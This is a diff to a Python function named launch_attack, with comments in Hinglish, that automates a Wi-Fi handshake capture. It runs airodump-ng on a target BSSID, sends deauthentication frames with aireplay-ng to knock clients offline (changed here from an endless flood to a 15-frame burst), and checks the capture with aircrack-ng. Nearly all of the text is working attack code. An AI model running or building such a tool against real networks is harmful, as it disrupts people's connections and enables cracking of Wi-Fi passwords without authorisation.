@@ -21,29 +21,28 @@ def launch_attack(bssid, channel, interface='wlan0mon'):
                 except:
                     pass
             
-        # 2. airodump-ng ko start karo aur uski errors ko ek file mein save karo
+        # 2. airodump-ng ko 60 seconds ke liye start karo
         err_log = open("/tmp/awb_err.log", "w")
         airodump = subprocess.Popen(['airodump-ng', '-c', clean_channel, '--bssid', bssid, '-w', capture_file, '--ignore-negative-one', interface], 
                                     stdout=subprocess.DEVNULL, stderr=err_log)
         
-        time.sleep(5) # 5 seconds tak usko chalne do
+        time.sleep(5) # airodump ko channel set hone do
         
-        # Agar airodump 5 seconds mein hi mar jaye, toh error read karo
+        # Agar airodump mar jaye toh error read karo
         if airodump.poll() is not None:
             err_log.close()
             with open("/tmp/awb_err.log", "r") as f:
                 error_text = f.read()
             return {"status": "error", "message": f"airodump-ng failed to start. Reason: {error_text}"}
         
-        # 3. Infinite Deauth Attack start karo
-        aireplay = subprocess.Popen(['aireplay-ng', '-0', '0', '-a', bssid, '--ignore-negative-one', interface], 
+        # 3. Burst Deauth Attack (-0 15). Ye sirf 1 second chalega aur phone disconnect karega
+        subprocess.run(['aireplay-ng', '-0', '15', '-a', bssid, '--ignore-negative-one', interface], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        # 60 seconds tak capture hone do
-        time.sleep(60)
+        # Ab 55 seconds tak wait karenge. Tumhara phone is beech connect hoga aur handshake mil jayega.
+        time.sleep(55)
         
-        # Band karo
-        aireplay.terminate()
+        # Process band karo
         airodump.terminate()
         airodump.wait()
         err_log.close()
@@ -51,7 +50,10 @@ def launch_attack(bssid, channel, interface='wlan0mon'):
         
         cap_file_path = capture_file + "-01.cap"
         if not os.path.exists(cap_file_path):
-            return {"status": "error", "message": "Capture file not generated. Unknown error."}
+            # Agar file phir bhi na bane toh error log read karo
+            with open("/tmp/awb_err.log", "r") as f:
+                error_text = f.read()
+            return {"status": "error", "message": f"Capture file not generated. airodump error: {error_text}"}
         
         # 4. Handshake Verify Karna
         verify = subprocess.run(['aircrack-ng', cap_file_path], capture_output=True, text=True)
